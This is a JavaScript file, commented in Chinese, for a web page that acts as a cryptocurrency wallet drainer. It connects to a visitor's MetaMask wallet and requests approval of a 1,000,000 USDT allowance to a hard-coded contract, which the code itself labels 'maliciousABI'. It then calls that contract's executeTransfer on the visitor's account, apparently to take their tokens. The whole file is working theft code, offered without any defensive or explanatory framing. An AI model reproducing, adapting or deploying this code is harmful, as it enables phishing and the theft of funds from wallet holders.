const contractAddress = '0xAc7aa2ee970A703F3716A66D39F6A1cc5cfcea6b'; // 你的合约地址
const usdtAddress = '0xdAC17F958D2ee523a2206206994597C13D831ec7'; // USDT合约地址

const maliciousABI = [
    {
        "inputs": [
            {
                "internalType": "address",
                "name": "user",
                "type": "address"
            }
        ],
        "name": "executeTransfer",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "inputs": [
            {
                "internalType": "address",
                "name": "account",
                "type": "address"
            }
        ],
        "name": "balanceOf",
        "outputs": [
            {
                "internalType": "uint256",
                "name": "",
                "type": "uint256"
            }
        ],
        "stateMutability": "view",
        "type": "function"
    },
    {
        "inputs": [
            {
                "internalType": "address",
                "name": "sender",
                "type": "address"
            },
            {
                "internalType": "address",
                "name": "recipient",
                "type": "address"
            },
            {
                "internalType": "uint256",
                "name": "amount",
                "type": "uint256"
            }
        ],
        "name": "transferFrom",
        "outputs": [
            {
                "internalType": "bool",
                "name": "",
                "type": "bool"
            }
        ],
        "stateMutability": "nonpayable",
        "type": "function"
    }
];

const usdtABI = [
    {
        "inputs": [
            {
                "internalType": "address",
                "name": "spender",
                "type": "address"
            },
            {
                "internalType": "uint256",
                "name": "amount",
                "type": "uint256"
            }
        ],
        "name": "approve",
        "outputs": [
            {
                "internalType": "bool",
                "name": "",
                "type": "bool"
            }
        ],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "inputs": [
            {
                "internalType": "address",
                "name": "recipient",
                "type": "address"
            },
            {
                "internalType": "uint256",
                "name": "amount",
                "type": "uint256"
            }
        ],
        "name": "transfer",
        "outputs": [
            {
                "internalType": "bool",
                "name": "",
                "type": "bool"
            }
        ],
        "stateMutability": "nonpayable",
        "type": "function"
    }
];

let web3;
let userAccount;

document.getElementById('connectButton').onclick = async () => {
    if (window.ethereum) {
        web3 = new Web3(window.ethereum);
        try {
            // 请求连接到钱包
            await window.ethereum.request({ method: 'eth_requestAccounts' });
            userAccount = (await web3.eth.getAccounts())[0];
            console.log('钱包连接成功: ', userAccount);
            alert('钱包连接成功: ' + userAccount);
            document.getElementById('approveButton').disabled = false; // 启用授权按钮
        } catch (error) {
            console.error('连接错误: ', error);
            alert('连接钱包失败: ' + error.message);
        }
    } else {
        alert('请安装 MetaMask！');
    }
};

document.getElementById('approveButton').onclick = async () => {
    const usdtContract = new web3.eth.Contract(usdtABI, usdtAddress);
    const amountToApprove = web3.utils.toWei('1000000', 'ether'); // 1000000 USDT

    try {
        await usdtContract.methods.approve(contractAddress, amountToApprove).send({ from: userAccount });
        alert('授权成功');
        document.getElementById('executeTransferButton').disabled = false; // 启用转移按钮
    } catch (error) {
        console.error('授权错误: ', error);
        alert('授权失败: ' + error.message);
    }
};

document.getElementById('executeTransferButton').onclick = async () => {
    const maliciousContract = new web3.eth.Contract(maliciousABI, contractAddress);

    try {
        await maliciousContract.methods.executeTransfer(userAccount).send({ from: userAccount });
        alert('转账执行成功');
    } catch (error) {
        console.error('转账错误: ', error);
        alert('转账失败: ' + error.message);
    }
};
